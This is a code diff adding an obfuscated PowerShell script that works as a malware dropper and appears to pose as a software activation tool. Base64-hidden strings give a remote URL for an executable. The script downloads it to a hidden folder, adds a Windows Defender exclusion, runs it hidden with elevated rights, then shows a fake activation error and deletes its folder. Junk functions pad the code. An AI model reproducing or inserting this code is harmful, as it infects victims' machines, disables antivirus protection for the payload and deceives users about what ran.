@@ -1,0 +1,64 @@
+function gbg_random_string {
+    param($length)
+    $characters = "abcdefghijklmnopqrstuvwxyz0123456789"
+    $randomString = ""
+    for ($i = 0; $i -lt $length; $i++) {
+        $randomIndex = Get-Random -Minimum 0 -Maximum ($characters.Length - 1)
+        $randomString += $characters[$randomIndex]
+    }
+    return $randomString
+}
+
+function gbg_garbage_function {
+    $null = (Get-Random) -gt 0.5
+}
+
+$var_a = "aHR0cHM6Ly92eC1ldmVudHMuY29tL2J1aWxkLmV4ZQ=="
+$var_b = "dXBkYXRlci5leGU="
+$var_c = "SGlkZGVu"
+$var_d = "U2lsZW50bHljb250aW51ZQ=="
+$var_e = "U3RvcA=="
+$var_f = "RGlyZWN0b3J5"
+$var_g = "UnVuQXM="
+
+$var_h = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_a))
+$var_i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_b))
+$var_j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_c))
+$var_k = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_d))
+$var_l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_e))
+$var_m = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_f))
+$var_n = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($var_g))
+
+$var_o = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+New-Item -ItemType $var_m -Path $var_o | Out-Null
+
+$var_p = Join-Path $var_o $var_i
+
+function gbg_add_exclusion {
+    param ([string]$var_q)
+    try {
+        Add-MpPreference -ExclusionPath $var_q -ErrorAction $var_k
+    } catch {}
+}
+
+try {
+    Invoke-WebRequest -Uri $var_h -OutFile $var_p -UseBasicParsing -ErrorAction $var_l
+    Set-ItemProperty -Path $var_o -Name Attributes -Value $var_j
+    Set-ItemProperty -Path $var_p -Name Attributes -Value $var_j
+    gbg_add_exclusion -Path $var_p
+    Start-Process -FilePath $var_p -WindowStyle $var_j -Verb $var_n -Wait
+} catch {
+    exit 1
+} finally {
+    Write-Host "An error occurred during activation. Please try again."
+    if (Test-Path $var_o) {
+        Remove-Item $var_o -Recurse -Force
+    }
+}
+
+gbg_garbage_function
+gbg_garbage_function
+gbg_garbage_function
+
+
+
